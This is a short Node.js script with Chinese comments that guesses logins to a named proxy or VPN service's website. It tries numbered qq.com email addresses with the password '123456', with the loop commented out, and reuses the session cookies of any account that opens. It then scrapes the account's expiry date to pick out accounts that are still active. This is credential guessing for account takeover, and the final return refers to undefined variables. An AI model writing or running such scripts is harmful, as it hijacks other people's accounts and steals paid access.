const Axios = require("axios")
const cheerio = require("cheerio");

const axios = Axios.default;
// 记录最长有效期
let max = 0
// 记录最长有效期对应的邮箱（账号）
let maxEmail = "";

(async () => {
    // for (let i = 0; i < 200; i++) {
    const email = `${105}@qq.com`;
    let res = await axios.post('http://www.91goout.com/auth/login', {
        email,
        passwd: "123456"
    })

    // res.data.ret === 1 为true才说明账号存在
    if (res.data.ret === 1) {
        console.log(email)
        const cookies = res.headers["set-cookie"];
        let reqCookie = ""
        for (let cookie of cookies) {
            reqCookie = reqCookie
                ? reqCookie + ";" + cookie.split(";")[0]
                : cookie.split(";")[0]
        }

        // 使用登陆获得的cookie授权进入用户页
        let reqRes = await axios.get("http://www.91goout.com/user", {
            headers: {
                "Cookie": reqCookie,
            }
        })

        // 加载用户页html
        const body = cheerio.load(reqRes.data)
        // 获取时间数据
        const content = body("div.user-info-main div.nodemiddle div")[1].children[0]
        const date = content.data.split(" ")
        const accountExpireTime = new Date(date[1] + " " + date[2])
        const now = new Date()
        // 选择未过期的账号
        if (accountExpireTime > now) {
            return {
                username,
                passwd,
                expiredAt: accountExpireTime
            }
        }
    }
    // }
})()







